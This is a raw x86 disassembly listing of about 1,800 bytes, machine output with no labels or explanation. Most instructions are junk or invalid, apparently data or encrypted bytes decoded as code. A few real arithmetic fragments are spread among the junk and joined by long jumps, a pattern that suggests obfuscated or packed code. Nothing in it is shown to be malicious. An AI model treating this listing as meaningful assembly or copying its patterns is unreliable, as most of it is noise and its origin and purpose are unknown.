  40fd3d:	xchg   ebp,eax
  40fd3e:	loop   0x40fd62
  40fd40:	add    al,0xa6
  40fd42:	xchg   edi,eax
  40fd43:	push   ds
  40fd44:	adc    al,0x66
  40fd46:	pusha  
  40fd47:	pop    ecx
  40fd48:	add    dl,BYTE PTR [edi+ecx*8+0xf]
  40fd4c:	fidivr WORD PTR [edx]
  40fd4e:	pop    edi
  40fd4f:	daa    
  40fd50:	push   ebx
  40fd51:	cmp    BYTE PTR ds:0x962cadb2,bh
  40fd57:	push   0xa9e6b9c0
  40fd5c:	fimul  WORD PTR [esi]
  40fd5e:	sbb    ebx,DWORD PTR [eax-0x3b]
  40fd61:	lds    esi,FWORD PTR [ebx]
  40fd63:	mov    cl,0x10
  40fd65:	shl    BYTE PTR [eax-0x14c26f79],0x89
  40fd6c:	xchg   BYTE PTR [eax-0x15b4a62e],al
  40fd72:	push   0xc911e6ef
  40fd77:	dec    ecx
  40fd78:	nop
  40fd79:	jg     0x40fde5
  40fd7b:	les    edx,FWORD PTR [ebx]
  40fd7d:	or     al,0x23
  40fd7f:	sbb    ch,BYTE PTR [ebp+esi*4-0x5]
  40fd83:	dec    ecx
  40fd84:	mov    ebp,0x558bfa2b
  40fd89:	cld    
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	cmp    DWORD PTR [eax+0x4b7a9d0c],ebp
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	aaa    
  40fdc8:	faddp  st(7),st
  40fdca:	clc    
  40fdcb:	(bad)  [ebx]
  40fdcd:	aaa    
  40fdce:	out    dx,al
  40fdcf:	fdivr  DWORD PTR [esi+esi*4+0x2]
  40fdd3:	sbb    eax,0xa0095277
  40fdd8:	outs   dx,BYTE PTR ds:[esi]
  40fdd9:	shl    eax,1
  40fddb:	push   es
  40fddc:	cdq    
  40fddd:	cmp    DWORD PTR [eax+0x7d],0x29
  40fde1:	jb     0x40fe1e
  40fde3:	int3   
  40fde4:	mov    esp,0x2d3b5a9
  40fde9:	call   0x1ad4b4ab
  40fdee:	pop    ss
  40fdef:	scas   eax,DWORD PTR es:[edi]
  40fdf0:	aam    0xd6
  40fdf2:	pop    esp
  40fdf3:	push   edx
  40fdf4:	(bad)  
  40fdf5:	lock cmp BYTE PTR [ebx],0x34
  40fdf9:	xchg   ebx,eax
  40fdfa:	aad    0xe1
  40fdfc:	repnz adc DWORD PTR [eax+edx*4],ebp
  40fe00:	mov    bh,0xbf
  40fe02:	or     ch,dl
  40fe04:	fmul   DWORD PTR [esi+0x3d]
  40fe07:	mov    ch,0x89
  40fe09:	xchg   ebx,eax
  40fe0a:	daa    
  40fe0b:	(bad)  
  40fe0c:	pop    es
  40fe0d:	setg   BYTE PTR [ecx+0x3c23ea1d]
  40fe14:	aam    0xfb
  40fe16:	sti    
  40fe17:	pop    edi
  40fe18:	jp     0x40fe58
  40fe1a:	adc    eax,0x4fa5efbd
  40fe1f:	mov    ds:0x85f5fbe7,eax
  40fe24:	xor    eax,0x43e397f2
  40fe29:	aad    0x14
  40fe2b:	jecxz  0x40fe99
  40fe2d:	inc    esi
  40fe2e:	out    0x5,al
  40fe30:	imul   edi,DWORD PTR [edi-0x1b],0xd72f4174
  40fe37:	div    BYTE PTR [ecx-0x68089bfe]
  40fe3d:	fcomp  QWORD PTR [edx+0x4e]
  40fe40:	mov    esi,0xbc503a8
  40fe45:	fdivr  st(7),st
  40fe47:	inc    eax
  40fe48:	mov    ebp,0x1de425cf
  40fe4d:	stos   DWORD PTR es:[edi],eax
  40fe4e:	cmp    al,0xc2
  40fe50:	adc    eax,0x9fae8ad
  40fe55:	jp     0x40fdf7
  40fe57:	mov    ds:0x4147dfe4,eax
  40fe5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe5d:	cmp    DWORD PTR [ecx-0x1753727a],0x3a
  40fe64:	lahf   
  40fe65:	pushf  
  40fe66:	pushf  
  40fe67:	and    al,0x8f
  40fe69:	and    al,0xac
  40fe6b:	jmp    0xc8be:0xd984f8a5
  40fe72:	xchg   esp,eax
  40fe73:	pop    ds
  40fe74:	loope  0x40fe88
  40fe76:	stos   BYTE PTR es:[edi],al
  40fe77:	mov    al,0xca
  40fe79:	adc    BYTE PTR [ebx-0x2a],bh
  40fe7c:	(bad)  
  40fe7d:	xor    al,0xf4
  40fe7f:	(bad)  
  40fe80:	in     eax,0x18
  40fe82:	int    0xcc
  40fe84:	dec    esi
  40fe85:	push   0x4c722c52
  40fe8a:	xor    ah,BYTE PTR [ecx-0x37]
  40fe8d:	xor    DWORD PTR ss:0xff4223d1,ebp
  40fe94:	into   
  40fe95:	xor    eax,0x1e55890e
  40fe9a:	ss jno 0x40fe21
  40fe9d:	stc    
  40fe9e:	sub    edx,DWORD PTR [ebx-0xd33efec]
  40fea4:	jno    0x40fe38
  40fea6:	lods   eax,DWORD PTR ds:[esi]
  40fea7:	adc    DWORD PTR [ecx-0x469f16ef],ebp
  40fead:	cs not edi
  40feb0:	jo     0x40fefb
  40feb2:	(bad)  
  40feb3:	retf   0xa7
  40feb6:	jae    0x40fe8f
  40feb8:	dec    esi
  40feb9:	aas    
  40feba:	mov    ebx,0x1911c315
  40febf:	cmp    dh,BYTE PTR [esi+0x69]
  40fec2:	sbb    al,0xd2
  40fec5:	pop    esi
  40fec6:	sub    DWORD PTR [ebp-0x50],eax
  40fec9:	or     eax,0x163d546d
  40fece:	fdiv   DWORD PTR [ecx-0x2bd69b40]
  40fed4:	xor    ebx,eax
  40fed6:	push   esp
  40fed7:	xor    BYTE PTR [edi-0x71],al
  40feda:	ror    DWORD PTR [ecx+0x7d],0x58
  40fede:	xchg   ecx,eax
  40fedf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fee0:	mov    ds:0xc4de3cc8,al
  40fee5:	jbe    0x40fe7c
  40fee7:	scas   al,BYTE PTR es:[edi]
  40fee8:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40feea:	sbb    ah,BYTE PTR [edx]
  40feec:	and    BYTE PTR [edi+ebx*4],0x16
  40fef0:	mov    ebx,0xe9204650
  40fef5:	or     al,0xf9
  40fef7:	jmp    0x40ff6e
  40fef9:	or     esp,DWORD PTR [edx-0x622ff280]
  40feff:	out    0xd3,al
  40ff01:	ret    0x60da
  40ff04:	mov    ebp,0x96f32214
  40ff09:	add    al,0x9f
  40ff0b:	push   edi
  40ff0c:	mov    ah,0x7f
  40ff0e:	sub    DWORD PTR [edx+0x2b],eax
  40ff11:	jmp    0xe32a:0xafbfd511
  40ff18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff19:	lods   al,BYTE PTR ds:[esi]
  40ff1a:	mov    ebp,0xd5af44f4
  40ff1f:	xchg   ecx,eax
  40ff20:	repnz imul edi,DWORD PTR [eax],0x6e4f6c47
  40ff27:	das    
  40ff28:	lods   eax,DWORD PTR ds:[esi]
  40ff29:	ss mov edi,0x9f81cdd6
  40ff2f:	cwde   
  40ff30:	xchg   ebx,eax
  40ff31:	and    ecx,esi
  40ff33:	loop   0x40ff97
  40ff35:	jae    0x40ffa5
  40ff37:	js     0x40ff38
  40ff39:	lods   al,BYTE PTR ds:[esi]
  40ff3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff3b:	scas   eax,DWORD PTR es:[edi]
  40ff3c:	lods   al,BYTE PTR ds:[esi]
  40ff3d:	pop    edx
  40ff3e:	(bad)  
  40ff3f:	test   al,0x27
  40ff41:	mov    esp,0x4d4b7eb0
  40ff46:	dec    eax
  40ff47:	(bad)  
  40ff49:	or     esp,ecx
  40ff4b:	(bad)  
  40ff4c:	inc    edx
  40ff4d:	sbb    BYTE PTR [eax-0xa],bh
  40ff50:	sbb    ecx,edx
  40ff52:	mov    cl,0xd5
  40ff54:	adc    ah,ch
  40ff56:	xchg   BYTE PTR [ebx],ah
  40ff58:	bnd je 0x40ff8d
  40ff5b:	loopne 0x40ff5b
  40ff5d:	test   DWORD PTR [ebx],esp
  40ff5f:	mov    bl,0xb4
  40ff61:	sub    eax,0x85e337d9
  40ff66:	xchg   esi,eax
  40ff67:	ds push edx
  40ff69:	pusha  
  40ff6a:	aaa    
  40ff6b:	xor    esi,DWORD PTR [esi-0x32]
  40ff6e:	in     eax,0x13
  40ff70:	add    BYTE PTR [esi-0x3f],al
  40ff73:	and    esi,DWORD PTR [ebp-0x4d92240a]
  40ff79:	adc    esi,ebx
  40ff7b:	add    dl,BYTE PTR [eax+0x12c2fe0]
  40ff81:	or     BYTE PTR [edx-0x67fb2fab],0x47
  40ff88:	pop    esi
  40ff89:	retf   
  40ff8a:	mov    edi,0xbcb057fe
  40ff8f:	jl     0x40ff23
  40ff91:	aam    0xad
  40ff93:	imul   ecx
  40ff95:	rcr    BYTE PTR [esi+0x6d25b7ee],0xfa
  40ff9c:	int3   
  40ff9d:	inc    edx
  40ff9e:	cdq    
  40ff9f:	xchg   ecx,eax
  40ffa0:	mov    dl,0x19
  40ffa2:	cmc    
  40ffa3:	into   
  40ffa4:	or     DWORD PTR [edi],ecx
  40ffa6:	jge    0x40ff97
  40ffa8:	add    BYTE PTR [eax+0xdaba29b],cl
  40ffae:	repz cwde 
  40ffb0:	inc    esp
  40ffb1:	mov    al,ds:0xf48da74e
  40ffb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffb7:	mov    edi,cs
  40ffb9:	xchg   ebx,eax
  40ffba:	outs   dx,BYTE PTR ds:[esi]
  40ffbb:	gs jo  0x40ffd5
  40ffbe:	enter  0x2f80,0x4
  40ffc2:	ja     0x410014
  40ffc4:	out    0x52,eax
  40ffc6:	mov    cl,0xbd
  40ffc8:	or     DWORD PTR [ecx+0x3d],0x6d
  40ffcc:	and    dl,bh
  40ffce:	dec    esp
  40ffcf:	mov    edx,0x731d24e9
  40ffd4:	mov    WORD PTR [edi],ss
  40ffd6:	inc    edx
  40ffd7:	xchg   BYTE PTR [esi+esi*8+0x45cfc21f],dl
  40ffde:	pop    ebp
  40ffdf:	stos   BYTE PTR es:[edi],al
  40ffe0:	xchg   BYTE PTR [ebx],al
  40ffe2:	popa   
  40ffe3:	arpl   WORD PTR [edi+0x4ddb3408],bx
  40ffe9:	aas    
  40ffea:	stos   DWORD PTR es:[edi],eax
  40ffeb:	cmp    al,0x2
  40ffed:	dec    esi
  40ffee:	ds mov ecx,0xb2ac0bae
  40fff4:	outs   dx,DWORD PTR ds:[esi]
  40fff5:	push   esi
  40fff6:	sahf   
  40fff7:	dec    ebp
  40fff8:	je     0x410067
  40fffa:	push   ebp
  40fffb:	shl    BYTE PTR [ebp-0x72],cl
  40fffe:	lods   eax,DWORD PTR ds:[esi]
  40ffff:	ret    0xc4ac
  410002:	ror    DWORD PTR [ebp+0x31],cl
  410005:	mov    dh,al
  410007:	popa   
  410008:	sar    BYTE PTR [ecx+0x56fa63b9],1
  41000e:	lea    ecx,ds:0xfd4fd9dd
  410014:	loope  0x40ffc2
  410016:	int    0x7e
  410018:	dec    eax
  410019:	xor    BYTE PTR [edx],dl
  41001b:	cli    
  41001c:	leave  
  41001d:	push   ebp
  41001e:	cmp    ebp,eax
  410020:	sub    al,0x1f
  410022:	cmp    DWORD PTR [esi-0x20],edi
  410025:	and    ebp,esi
  410027:	mov    edi,0x5d6dcbdc
  41002c:	dec    eax
  41002d:	xlat   BYTE PTR ds:[ebx]
  41002e:	stc    
  41002f:	inc    ecx
  410030:	aad    0x88
  410032:	mov    ebx,DWORD PTR [ebp-0x10]
  410035:	sub    ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	fwait
  410069:	mov    edi,0x48e79c59
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	push   cs
  410075:	jle    0x41007c
  410077:	mov    edi,0x56350b0
  41007c:	xchg   esi,eax
  41007d:	loop   0x41007d
  41007f:	(bad)  
  410080:	mov    cl,0x13
  410082:	icebp  
  410083:	xchg   ecx,eax
  410084:	mov    ah,0xae
  410086:	jns    0x410035
  410088:	lods   eax,DWORD PTR ds:[esi]
  410089:	aad    0x40
  41008b:	loop   0x41002b
  41008d:	not    BYTE PTR [eax+0x5c]
  410090:	pop    es
  410091:	mov    ecx,0xcffc4
  410096:	add    DWORD PTR [esi],esp
  410098:	cli    
  410099:	int3   
  41009a:	sbb    ebx,DWORD PTR [eax-0x7e]
  41009d:	push   ebx
  41009e:	pop    ss
  41009f:	cdq    
  4100a0:	mov    ds:0xe57ff1f4,eax
  4100a5:	test   BYTE PTR [eax+edx*2],bh
  4100a8:	popf   
  4100a9:	xchg   esp,eax
  4100aa:	add    ah,BYTE PTR [edi]
  4100ac:	sbb    eax,0xedb97cd1
  4100b1:	dec    edi
  4100b2:	pop    edi
  4100b3:	jae    0x41005a
  4100b5:	jns    0x4100e7
  4100b7:	popa   
  4100b8:	adc    ebp,DWORD PTR [ecx+0x6]
  4100bb:	mov    ah,BYTE PTR [eax+edx*4+0x334ff969]
  4100c2:	sub    eax,esi
  4100c4:	pop    ds
  4100c5:	fisttp DWORD PTR [edi-0x80]
  4100c8:	pusha  
  4100c9:	mov    ah,0x97
  4100cb:	lock inc edx
  4100cd:	xcrypt-ctr (bad)
  4100ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100cf:	fisub  WORD PTR [esi]
  4100d1:	jbe    0x41007f
  4100d3:	pop    ds
  4100d4:	mov    edi,0x42f35dd1
  4100d9:	out    dx,eax
  4100da:	sbb    al,BYTE PTR [esi+0x6f]
  4100dd:	bound  sp,DWORD PTR [esi]
  4100e0:	into   
  4100e1:	repz xor ebx,DWORD PTR [edi-0x4661b2c5]
  4100e8:	inc    ebp
  4100e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100ea:	mov    ebp,esi
  4100ec:	jmp    DWORD PTR [edx+esi*2+0x57]
  4100f0:	dec    esp
  4100f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100f2:	in     al,0x8c
  4100f4:	into   
  4100f5:	and    dh,BYTE PTR [edx]
  4100f7:	jge    0x4100c6
  4100f9:	(bad)  
  4100fa:	jno    0x4100fe
  4100fc:	mov    ?,WORD PTR [esi-0x15bd6625]
  410102:	pop    ebp
  410103:	and    DWORD PTR [ebx+0x2],0x435513b2
  41010a:	les    eax,FWORD PTR [eax]
  41010c:	and    al,0xdc
  41010e:	lock sub DWORD PTR [ebp-0x4c],esi
  410112:	lock pop esi
  410114:	push   0x63
  410116:	fwait
  410117:	sub    eax,0x338e20fa
  41011c:	mov    edi,0xd23830e3
  410121:	in     al,dx
  410122:	fisub  DWORD PTR [edx]
  410124:	cmc    
  410125:	fcomp  QWORD PTR [esi+0x7c]
  410128:	xlat   BYTE PTR ds:[ebx]
  410129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41012a:	popf   
  41012b:	jns    0x4100cb
  41012d:	ds addr16 loope 0x410104
  410131:	out    0x93,al
  410133:	retf   
  410134:	jo     0x41012f
  410136:	push   esp
  410137:	out    dx,al
  410138:	nop
  410139:	pushf  
  41013a:	addr16 loop 0x4100c7
  41013d:	cmp    al,BYTE PTR [eax-0x21]
  410140:	and    ebx,ecx
  410142:	push   edx
  410143:	fisttp QWORD PTR [ecx]
  410145:	mul    BYTE PTR [eax]
  410147:	fld    QWORD PTR [ebp+0x2b]
  41014a:	fcmovnbe st,st(4)
  41014c:	dec    eax
  41014d:	inc    esp
  41014e:	aaa    
  41014f:	sbb    edx,DWORD PTR [esi+ecx*4+0x2c07e8da]
  410156:	and    DWORD PTR ds:0xec231e6c,0xf008f0f9
  410160:	push   es
  410161:	ret    0xcecc
  410164:	mov    cl,0x47
  410166:	arpl   WORD PTR [esi+0x9],cx
  410169:	pop    ebp
  41016a:	imul   eax,DWORD PTR [esi+0xa3bd399],0xde4622e2
  410174:	xchg   al,ch
  410176:	imul   eax,esp,0x53
  410179:	test   DWORD PTR [esi+eax*2-0x50730303],ebx
  410180:	mov    esi,0x25268e9a
  410185:	imul   ebp,DWORD PTR [eax-0x3fe7aa4c],0x64
  41018c:	xchg   esp,eax
  41018d:	sub    al,0xf8
  41018f:	test   al,0x31
  410191:	push   edi
  410192:	sbb    edx,ecx
  410194:	imul   esp,DWORD PTR [eax-0x5],0x7d836fff
  41019b:	enter  0x654e,0x92
  41019f:	jb     0x41013c
  4101a1:	mov    al,ds:0x678f78b7
  4101a6:	mov    ?,WORD PTR [edi+0x3a058df0]
  4101ac:	xchg   esp,eax
  4101ad:	mov    ds:0xa67109b4,al
  4101b2:	mov    ds:0x56c83be6,eax
  4101b7:	rol    ebp,1
  4101b9:	aaa    
  4101ba:	pop    ebx
  4101bb:	fsincos 
  4101bd:	sbb    DWORD PTR [ebp+0x2c7504b9],ecx
  4101c3:	jle    0x4101b3
  4101c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101c6:	pop    ecx
  4101c7:	jge    0x410157
  4101c9:	push   ebp
  4101ca:	push   esp
  4101cb:	out    0x94,al
  4101cd:	stos   DWORD PTR es:[edi],eax
  4101ce:	call   0xc3397c37
  4101d3:	loop   0x41024d
  4101d5:	mov    ch,0x3c
  4101d7:	rcr    BYTE PTR [ecx+0x31ea9361],cl
  4101dd:	inc    esp
  4101de:	bound  eax,QWORD PTR [edx+0xfb05276]
  4101e4:	das    
  4101e5:	int3   
  4101e6:	hlt    
  4101e7:	es dec ecx
  4101e9:	es nop
  4101eb:	xchg   ecx,eax
  4101ec:	and    BYTE PTR [edx-0x72],al
  4101ef:	sub    dl,BYTE PTR ds:0xae669537
  4101f5:	(bad)  
  4101f7:	xor    DWORD PTR es:[ebp+0x5d],edi
  4101fb:	inc    ebp
  4101fc:	and    edx,DWORD PTR [edx+0x20949ff]
  410202:	bnd ret 
  410204:	xor    al,0x68
  410206:	mov    bh,0xe2
  410208:	outs   dx,BYTE PTR ds:[esi]
  410209:	sub    edx,DWORD PTR [ebx-0x2595f927]
  41020f:	sbb    DWORD PTR [ebp+ebx*2-0x4766f313],eax
  410216:	cmp    eax,0xbe736f46
  41021b:	fbld   TBYTE PTR [eax-0x40135571]
  410221:	sub    cl,dh
  410223:	test   BYTE PTR [eax-0x658f1a52],0x3d
  41022a:	lds    ebp,FWORD PTR cs:[ecx]
  41022d:	pop    esi
  41022e:	xor    bl,ch
  410230:	ins    DWORD PTR es:[edi],dx
  410231:	retf   
  410232:	mov    dl,0xf9
  410234:	iret   
  410235:	mov    ah,0xc4
  410237:	jecxz  0x41028e
  410239:	add    al,0x9c
  41023b:	jne    0x410227
  41023d:	sub    DWORD PTR [eax-0x7efe4b74],esp
  410243:	push   0xffffffb4
  410245:	jnp    0x410209
  410247:	dec    eax
  410248:	stos   BYTE PTR es:[edi],al
  410249:	push   esi
  41024a:	pop    es
  41024b:	repnz xchg edx,eax
  41024d:	and    al,0xf6
  41024f:	jbe    0x3415e175
  410255:	outs   dx,DWORD PTR ds:[esi]
  410256:	retf   0xa6a6
  410259:	jnp    0x4102d2
  41025b:	adc    cl,BYTE PTR [eax+0x9]
  41025e:	fcom   DWORD PTR [edi+0x5a]
  410261:	ja     0x4102de
  410263:	mov    ebx,0x7be572b1
  410268:	aad    0x51
  41026a:	xchg   ecx,eax
  41026b:	lods   al,BYTE PTR ds:[esi]
  41026c:	mov    esi,0xdf8263cd
  410271:	dec    ecx
  410272:	or     eax,DWORD PTR [eax-0x61e87361]
  410278:	into   
  410279:	cmp    dh,ch
  41027b:	(bad)  
  41027d:	dec    ebp
  41027e:	jp     0x4102c4
  410280:	pop    es
  410281:	jne    0x4102e0
  410283:	adc    al,BYTE PTR [ecx+0x26db819e]
  410289:	adc    bh,BYTE PTR [edi+0x70]
  41028c:	mov    edx,0xd6a2a586
  410291:	aad    0xc0
  410293:	mov    al,0xf4
  410295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410296:	adc    BYTE PTR [eax+0x7fc63750],dh
  41029c:	adc    ecx,DWORD PTR [ebx-0x2826a501]
  4102a2:	or     eax,0x190ecf41
  4102a7:	mov    ecx,DWORD PTR [ecx]
  4102a9:	mov    al,ds:0x9aa2132
  4102ae:	add    DWORD PTR [ebx],ebx
  4102b0:	mov    al,0xb3
  4102b2:	mov    ebp,0x6cb1d342
  4102b7:	mov    dh,0x9c
  4102b9:	or     edx,eax
  4102bb:	out    0xaa,al
  4102bd:	lock scas al,BYTE PTR es:[edi]
  4102bf:	jmp    0x6e73:0xc89271b5
  4102c6:	jp     0x410317
  4102c8:	ins    DWORD PTR es:[edi],dx
  4102c9:	lahf   
  4102ca:	sbb    BYTE PTR [esi+0x3717b248],dh
  4102d0:	cli    
  4102d1:	pushf  
  4102d2:	mov    ebx,0xb4c18b26
  4102d7:	sub    esp,DWORD PTR [ecx+0x54]
  4102da:	ins    DWORD PTR es:[edi],dx
  4102db:	sub    DWORD PTR [edx],0xd103e063
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	loopne 0x41031b
  4102f4:	push   0xffffff8e
  4102f6:	dec    esp
  4102f7:	dec    esi
  4102f8:	js     0x410372
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	lds    ebp,FWORD PTR [eax-0x20]
  410301:	jmp    0xaf88:0x2c3afaf7
  410308:	rcr    cl,0x2e
  41030b:	leave  
  41030c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41030d:	into   
  41030e:	hlt    
  41030f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410310:	pop    edi
  410311:	sub    al,0x55
  410313:	retf   
  410314:	jle    0x41036f
  410316:	inc    esi
  410317:	cs ins BYTE PTR es:[edi],dx
  410319:	adc    bh,BYTE PTR [eax-0x75]
  41031c:	aam    0x3e
  41031e:	addr16 dec ecx
  410320:	dec    edx
  410321:	repz hlt 
  410323:	(bad)  
  410325:	jg     0x4102b1
  410327:	dec    ebp
  410328:	jp     0x4102c3
  41032a:	lock aam 0x77
  41032d:	push   ecx
  41032e:	or     DWORD PTR [edx-0x14836918],esp
  410334:	dec    eax
  410335:	cmp    DWORD PTR [edx+0xde1c8a1],esi
  41033b:	sbb    eax,0xe6e56172
  410340:	jo     0x4102c4
  410342:	or     edx,DWORD PTR [ebp-0x53]
  410345:	jecxz  0x41031a
  410347:	scas   eax,DWORD PTR es:[edi]
  410348:	shr    dl,cl
  41034a:	push   cs
  41034b:	inc    edx
  41034c:	pop    eax
  41034d:	shr    BYTE PTR [ecx+0x3d],cl
  410350:	(bad)  
  410351:	mov    dl,0xec
  410353:	and    BYTE PTR [edx+0x7cb569c9],0x72
  41035a:	xchg   esi,eax
  41035b:	jne    0x410333
  41035d:	fs aas 
  41035f:	inc    ebp
  410360:	inc    edi
  410361:	pop    ebx
  410362:	or     edi,eax
  410364:	popa   
  410365:	sbb    edx,DWORD PTR [esi+0x20]
  410368:	xchg   esi,eax
  410369:	xchg   esi,eax
  41036a:	loopne 0x410339
  41036c:	rol    DWORD PTR [esi*2-0x7ef44d34],1
  410373:	sub    al,0xf9
  410375:	push   ds
  410376:	inc    esp
  410377:	adc    al,0x31
  410379:	out    0x14,eax
  41037b:	adc    edx,edx
  41037d:	test   BYTE PTR ds:0xaae89c89,0xf7
  410384:	add    bh,BYTE PTR [ecx+0xb477208]
  41038a:	nop
  41038b:	enter  0x4d68,0xef
  41038f:	rol    DWORD PTR [ecx],cl
  410391:	xchg   DWORD PTR [ebx-0x3a1b11c6],esp
  410397:	jg     0x41037a
  410399:	jno    0x4103d7
  41039b:	cmc    
  41039c:	cdq    
  41039d:	pop    ss
  41039e:	dec    ecx
  41039f:	jmp    0x783b:0x6bbba8b9
  4103a6:	fidivr WORD PTR [ecx]
  4103a8:	push   ebx
  4103a9:	sub    BYTE PTR [edi-0x8],bh
  4103ac:	and    DWORD PTR [esi-0x50f53ea7],eax
  4103b2:	nop
  4103b3:	cmp    eax,0x637f7798
  4103b8:	mov    DWORD PTR [ebx],ecx
  4103ba:	cmp    al,BYTE PTR [ecx-0x11]
  4103bd:	lods   eax,DWORD PTR ds:[esi]
  4103be:	dec    edi
  4103bf:	cmp    DWORD PTR [esi-0x4],edx
  4103c2:	addr16 push edi
  4103c4:	iret   
  4103c5:	adc    dl,BYTE PTR [eax-0x77252e76]
  4103cb:	cmp    al,0x34
  4103cd:	jns    0x410374
  4103cf:	inc    esi
  4103d0:	dec    eax
  4103d1:	push   es
  4103d2:	push   ss
  4103d3:	jle    0x4103a2
  4103d5:	xor    esi,DWORD PTR [eax]
  4103d7:	in     eax,dx
  4103d8:	pop    es
  4103d9:	(bad)  
  4103da:	lahf   
  4103db:	pop    edx
  4103dc:	push   ecx
  4103dd:	int    0xa
  4103df:	sbb    BYTE PTR ds:0xb90e701,bh
  4103e5:	xor    BYTE PTR [ebp+0xd],al
  4103e8:	pop    es
  4103e9:	cmc    
  4103ea:	arpl   WORD PTR [ebx-0x1b],sp
  4103ed:	test   DWORD PTR [edx+0x20],0x42cbdd93
  4103f4:	push   edx
  4103f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103f6:	fisub  WORD PTR [edi-0x71f04bab]
  4103fc:	xor    ch,bl
  4103fe:	(bad)  
  4103ff:	in     al,dx
  410400:	in     eax,dx
  410401:	shl    cl,0xd2
  410404:	outs   dx,DWORD PTR fs:[esi]
  410406:	xchg   edi,eax
  410407:	repz out 0x28,al
  41040a:	mov    ebx,0xecf30c5a
  41040f:	ret    
  410410:	push   es
  410411:	sub    esp,DWORD PTR [edi-0x72]
  410414:	call   0x7bd579f4
  410419:	and    BYTE PTR [ecx],dh
  41041b:	mov    ecx,0xcb2c3a4d
  410420:	out    0x8a,al
  410422:	aad    0xc3
  410424:	xchg   ecx,eax
  410425:	xor    edi,DWORD PTR [edx-0x23b89738]
  41042b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41042c:	cwde   
  41042d:	fdivr  QWORD PTR [ecx-0x7a271540]
  410433:	dec    ecx
  410434:	xchg   ebp,eax
  410435:	cdq    
  410436:	pop    edx
  410437:	cmp    dh,BYTE PTR [edx+0x139794ea]
  41043d:	cmp    esi,eax
  41043f:	pop    eax
  410440:	lahf   
  410441:	mov    al,ds:0xad3ec259
  410446:	ret    0x9b30
  410449:	mov    BYTE PTR [ebp-0x7f],bh
  41044c:	push   ss
  41044d:	mov    al,ds:0x1073fc73
  410452:	mov    BYTE PTR [esi+0x3df1da89],cl
  410458:	jl     0x41040c
  41045a:	mov    esp,0x51800178
  41045f:	mov    esp,0x92721d37
  410464:	push   ss
  410465:	mov    al,0x64
  410467:	std    
  410468:	push   esp
  410469:	and    ebp,DWORD PTR [ebx]
  41046b:	jbe    0x410430
  41046d:	jmp    0x798c:0x7f0572e3
  410474:	pop    ebx
  410475:	mov    DWORD PTR [esi-0x51cce682],ebx
  41047b:	(bad)  
  41047c:	adc    BYTE PTR [edi+ebp*4-0x42],dh
  410480:	inc    edi
  410481:	aad    0x65
  410483:	jg     0x4104ea
  410485:	cmp    ebx,edi
  410487:	push   ebx
  410488:	aad    0x56
  41048a:	sbb    bh,dl
  41048c:	mov    ecx,0x1ebfdcb5
  410491:	jb     0x4104e0
  410493:	nop
  410494:	out    dx,al
  410495:	or     eax,0xa3840728
  41049a:	pop    edi
  41049b:	add    eax,0xc38e7e4d
  4104a0:	dec    DWORD PTR [edx]
  4104a2:	sbb    esi,DWORD PTR cs:0xb24ba45b
  4104a9:	or     al,0xd0
  4104ab:	mov    eax,0x6784dd95
  4104b0:	xchg   ecx,eax
  4104b1:	addr16 mov ax,dx
  4104b5:	or     dh,ch
  4104b7:	daa    
  4104b8:	sbb    eax,0x140553b5
  4104bd:	cmc    
  4104be:	mov    WORD PTR [esi-0x5f],?
  4104c1:	and    BYTE PTR [ecx+0x4c],bl
  4104c4:	ds test al,0xde
  4104c7:	add    BYTE PTR [ebp+0x7b173299],dl
  4104cd:	mov    BYTE PTR [esi],dl
  4104cf:	shl    DWORD PTR [eax],1
  4104d1:	xchg   ebp,eax
  4104d2:	shl    DWORD PTR [edx],1
  4104d4:	push   ebp
  4104d5:	daa    
  4104d6:	sub    dh,BYTE PTR [esp+ecx*2]
  4104d9:	lea    edi,[ebx-0x7]
